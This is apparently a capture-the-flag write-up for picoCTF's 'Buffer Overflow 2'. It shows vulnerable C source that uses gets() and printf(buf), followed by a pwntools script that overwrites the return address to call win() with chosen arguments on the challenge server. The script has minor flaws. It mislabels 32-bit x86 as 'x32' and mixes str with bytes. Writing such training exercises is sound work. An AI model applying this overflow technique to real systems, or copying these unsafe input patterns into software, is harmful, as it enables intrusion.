# Buffer Overflow 2

Simple buffer overflow, but with argument control.

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

After running a quick `checksec` on the program, we get this:

![image](https://github.com/nyiyui/ctf/blob/main/picoctf-2022/pwn/images/bo2checksec.png)

This means that it's an x32 file, making it very easy to exploit, since x32 uses `cdecl`. After a bit of code writing, this is our final program:

```python
from pwn import *

con = remote("saturn.picoctf.net", 62465)
winb = 0x08049296

payload = "";
payload += "a" * 112
payload += p32(winb)
payload += "CCCC"
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)
con.sendline(payload)
con.interactive()
```
